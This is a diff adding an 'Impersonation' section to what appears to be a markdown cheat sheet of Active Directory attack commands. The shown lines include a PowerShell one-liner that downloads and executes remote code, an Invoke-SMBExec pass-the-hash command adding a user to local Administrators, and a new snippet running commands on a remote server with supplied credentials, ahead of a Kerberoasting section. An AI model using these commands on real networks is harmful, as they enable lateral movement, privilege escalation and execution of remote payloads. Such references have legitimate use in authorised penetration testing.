@@ -118,6 +118,13 @@ powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString(‘
 Invoke-SMBExec -hash HASH -Target HOSTNAME -Domain DOMAIN -Username USERNAME -Command “net localgroup Administrateurs USERNAME /ADD” -verbose
 ```
 
+### Impersonation
+```markdown
+$password = ConvertTo-SecureString 'pasword_of_user_to_run_as' -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential('FQDN.DOMAIN\user_to_run_as', $password)
+Invoke-Command -ComputerName Server01 -Credential $credential -ScriptBlock { COMMAND }
+```
+
 ### Kerberoast
 GetUserSPNs and get hashes :
 ```markdown
